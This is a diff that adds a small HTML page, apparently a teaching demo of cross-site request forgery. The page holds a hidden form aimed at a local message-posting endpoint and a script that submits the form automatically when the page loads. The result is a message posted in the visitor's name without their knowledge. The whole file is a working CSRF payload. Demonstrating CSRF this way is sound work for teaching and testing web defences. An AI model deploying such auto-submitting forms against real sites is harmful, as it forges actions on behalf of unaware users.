@@ -1,0 +1,31 @@
+﻿<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title></title>
+    <style>
+        #add-your-message {
+            display:none;
+            visibility:hidden;
+        }
+    </style>
+</head>
+<body>
+
+</body>
+</html>
+
+
+<div id="add-your-message">
+    Add your message below:
+    <form id="csrf-form"action="http://localhost:54774/Message/Add" method="post">
+        <textarea cols="20" id="messageText" name="messageText" value="" rows="0" style="display:none">This was posted from another page you went to ... not you</textarea><br\>
+        <input type="submit" value="Post Message" style="display:none">
+    </form>
+
+    <script>
+        document.getElementById("csrf-form").submit();
+    </script>
+
+</div>
